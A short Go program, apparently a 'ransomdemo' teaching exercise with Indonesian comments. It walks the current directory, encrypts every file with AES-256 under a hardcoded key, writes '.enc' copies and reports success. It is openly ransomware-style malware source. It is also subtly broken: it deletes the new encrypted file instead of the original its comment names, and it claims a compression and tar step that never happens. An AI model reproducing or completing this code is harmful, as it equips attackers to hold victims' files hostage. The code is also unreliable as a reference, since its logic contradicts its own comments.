package main

import (
	"os"
	"path/filepath"

	"github.com/indomy/ransomdemo/pkg"
)

func main() {
	// Direktori yang ingin dikompresi dan dienkripsi
	dir := "."

	// Tambahkan semua file dan folder dari direktori ke arsip tar
	err := filepath.Walk(dir, func(file string, fi os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Abaikan direktori itu sendiri
		if fi.IsDir() {
			return nil
		}
		// Baca file
		data, err := os.ReadFile(file)
		if err != nil {
			return err
		}

		// Enkripsi data yang sudah dikompresi menggunakan AES
		key := []byte("indonesiacodeacademykeyto32bytes") // 32 bytes key for AES-256
		encryptedData, err := pkg.Encrypt(data, key)
		if err != nil {
			return err
		}

		// Simpan data terenkripsi ke file
		outputFile := file + ".enc"
		err = os.WriteFile(outputFile, encryptedData, 0644)
		if err != nil {
			return err
		}
		//hapus file aslinya
		err = os.Remove(outputFile)
		if err != nil {
			return err
		}

		return nil
	})

	if err != nil {
		println(err)
		panic(err)
	}

	println("File berhasil dienkripsi!")
}
